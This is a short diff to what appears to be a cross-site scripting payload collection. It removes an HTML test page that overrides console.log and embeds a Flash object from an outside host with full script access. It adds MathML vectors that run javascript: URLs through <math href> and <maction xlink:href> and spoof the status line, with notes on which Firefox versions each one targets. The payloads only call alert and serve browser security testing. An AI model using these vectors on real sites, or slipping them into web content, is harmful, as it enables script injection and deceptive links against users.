@@ -1,5 +1,9 @@
-<html><body>
-<script>console.log=function(a){alert(a);}</script>
-<object data="http://www.hemantsolo.tk/Google/test.html" allowscriptaccess="always" type="application/x-shockwave-flash"></object>
-</body></html>
+<math href="javascript:alert(1)">CLICKME</math>
 
+<math>
+<!-- up to FF 13 -->
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
+
+<!-- FF 14+ -->
+<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http//google.com</mtext></maction>
+</math>
